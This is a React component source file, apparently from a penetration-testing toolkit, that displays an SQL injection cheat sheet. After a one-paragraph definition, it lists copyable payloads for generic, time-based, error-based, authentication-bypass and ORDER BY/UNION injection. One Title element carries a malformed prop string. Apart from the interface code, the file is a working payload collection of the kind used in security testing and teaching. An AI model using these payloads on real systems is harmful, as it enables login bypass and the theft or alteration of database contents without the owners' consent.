import React from 'react';
import { Typography, Divider } from 'antd';
import QueueAnim from 'rc-queue-anim';

const { Title, Paragraph } = Typography;

export default (props) => {
	const BasicSql = [
		{ title: "' or '" },
		{ title: '-- or # ' },
		{ title: "' OR '1" },
		{ title: "' OR 1 -- -" },
		{ title: ' OR "" = "' },
		{ title: '" OR 1 = 1 -- -"' },
		{ title: "' OR '' = '" },
		{ title: "'='" },
		{ title: "'LIKE'" },
		{ title: "'=0--+" },
		{ title: 'OR 1=1' },
		{ title: "' OR 'x'='x" },
		{ title: "' AND id IS NULL; --" },
		{ title: "'''''''''''''UNION SELECT '2" }
	];
	const TimeBased = [
		{ title: ',(select * from (select(sleep(10)))a)' },
		{ title: '%2c(select%20*%20from%20(select(sleep(10)))a)' },
		{ title: "';WAITFOR DELAY '0:0:30'--" }
	];
	const ErrorBased = [
		{ title: 'OR 1=1' },
		{ title: 'OR 1=1#' },
		{ title: 'OR x=y#' },
		{ title: 'OR 1=1-- ' },
		{ title: 'OR x=x-- ' },
		{ title: "OR 3409=3409 AND ('pytW' LIKE 'pytW" },
		{ title: 'HAVING 1=1' },
		{ title: 'HAVING 1=1#' },
		{ title: 'HAVING 1=0-- ' },
		{ title: 'AND 1=1-- ' },
		{ title: "AND 1=1 AND '%'='" },
		{ title: 'WHERE 1=1 AND 1=0--' },
		{ title: "%' AND 8310=8310 AND '%'='" }
	];
	const AuthBased = [
		{ title: "' or ''-'" },
		{ title: "' or '' '" },
		{ title: "' or ''&'" },
		{ title: "' or ''^'" },
		{ title: "' or ''*'" },
		{ title: 'or true--' },
		{ title: '" or true--' },
		{ title: "' or true--" },
		{ title: '") or true--' },
		{ title: "') or true--" },
		{ title: "admin') or ('1'='1'--" },
		{ title: "admin') or ('1'='1'#" },
		{ title: "admin') or ('1'='1'/" }
	];
	const OrderUnion = [
		{ title: "1' ORDER BY 1--+" },
		{ title: "1' ORDER BY 2--+" },
		{ title: "1' ORDER BY 3--+" },
		{ title: "1' ORDER BY 1,2--+" },
		{ title: "1' ORDER BY 1,2,3--+" },
		{ title: "1' GROUP BY 1,2,--+" },
		{ title: "1' GROUP BY 1,2,3--+" },
		{ title: "' GROUP BY columnnames having 1=1 --" },
		{ title: "-1' UNION SELECT 1,2,3--+" },
		{ title: "' UNION SELECT sum(columnname ) from tablename --" },
		{ title: '-1 UNION SELECT 1 INTO @,@' },
		{ title: '-1 UNION SELECT 1 INTO @,@,@' },
		{ title: '1 AND (SELECT * FROM Users) = 1	' },
		{ title: "' AND MID(VERSION(),1,1) = '5';" },
		{
			title: "' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --"
		}
	];
	return (
		<QueueAnim delay={300} duration={1500}>
			<Title variant='Title level={3}' style={{ fontWeight: 'bold', margin: 15 }}>
				SQL Injection
			</Title>
			<Paragraph style={{ margin: 15 }}>
				SQL injection (SQLi) is an application security weakness that allows attackers to control an
				application’s database letting them access or delete data, change an application’s data-driven behavior,
				and do other undesirable things by tricking the application into sending unexpected SQL commands.
			</Paragraph>
			<Divider dashed />
			<div style={{ padding: 10, marginTop: 15 }} key='a'>
				<Title level={3}>Generic SQL Injection Payloads</Title>
				{BasicSql.map((k, i) => {
					return (
						<Paragraph key={i} copyable>
							{k.title}
						</Paragraph>
					);
				})}
			</div>
			<Divider dashed />
			<div
				key='b'
				style={{
					padding: 15,
					marginTop: 15
				}}
			>
				<Title level={3}>Time-Based</Title>
				{TimeBased.map((k, i) => {
					return (
						<Paragraph key={i} copyable>
							{k.title}
						</Paragraph>
					);
				})}
			</div>
			<Divider dashed />
			<div
				key='c'
				style={{
					padding: 15,
					marginTop: 15
				}}
			>
				<Title level={3}>Generic Error Based Payloads</Title>
				{ErrorBased.map((k, i) => {
					return (
						<Paragraph key={i} copyable>
							{k.title}
						</Paragraph>
					);
				})}
			</div>
			<Divider dashed />
			<div
				key='d'
				style={{
					padding: 15,
					marginTop: 15
				}}
			>
				<Title level={3}>Authentication Based Payloads</Title>
				{AuthBased.map((k, i) => {
					return (
						<Paragraph key={i} copyable>
							{k.title}
						</Paragraph>
					);
				})}
			</div>
			<Divider dashed />
			<div
				key='e'
				style={{
					padding: 15,
					marginTop: 15
				}}
			>
				<Title level={3}>Order by and UNION Based Payloads</Title>
				{OrderUnion.map((k, i) => {
					return (
						<Paragraph key={i} copyable>
							{k.title}
						</Paragraph>
					);
				})}
			</div>
		</QueueAnim>
	);
};
